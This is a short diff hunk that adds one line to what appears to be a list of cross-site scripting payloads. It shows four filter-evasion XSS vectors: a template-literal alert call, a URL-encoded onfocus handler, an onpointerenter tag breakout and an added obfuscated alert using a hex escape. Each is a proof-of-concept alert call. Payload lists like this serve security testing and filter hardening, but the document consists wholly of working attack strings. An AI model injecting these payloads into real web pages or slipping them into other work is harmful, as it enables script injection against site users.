@@ -3,3 +3,4 @@
 ''.replace.call`1${/./}${alert}` 
 %27%20onfocus=%27alert(/xss/)
 "><P/onpointerenter=alert(1)>
+-top['al\x65rt']('XD')-
